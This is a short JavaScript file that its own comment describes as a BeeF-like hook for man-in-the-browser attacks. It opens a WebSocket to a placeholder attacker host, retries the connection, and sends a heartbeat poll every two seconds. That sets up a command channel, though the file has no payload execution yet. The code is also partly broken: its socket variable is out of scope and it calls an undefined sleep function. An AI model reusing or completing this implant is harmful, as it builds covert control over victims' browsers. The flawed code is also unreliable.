//alert("This will be a hook similar to BeeF for Man In The Browser attacks");

const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");

var tries = 0
while (tries < 3) {
    console.log("Try: "+tries)
    try { 
        var socket = new WebSocket(poll_url);
        if (socket != null && socket != undefined) {
            console.log(socket);
            socket.onopen = function () {
                console.log("Status: connected.")
            };
        
            socket.onmessage = function (e) {
                console.log("Server sent:"+e.data)
            };    

            socket.onclose = function(event) {
                console.log("TODO: cleanup")
            };
            
            break;
        }
    } catch(e) {
        console.log(e)
        tries++;
        setTimeout(function(){
            sleep(1000);
        })
    }
}

// All good, we can start polling
if (tries < 3) {
    setInterval(function poll() {
        res={"poll":"hearthbeat", "id":"", "action_results":[]}
        socket.send(JSON.stringify(res));
    }, 2000);
} else {
    //Send error?
}

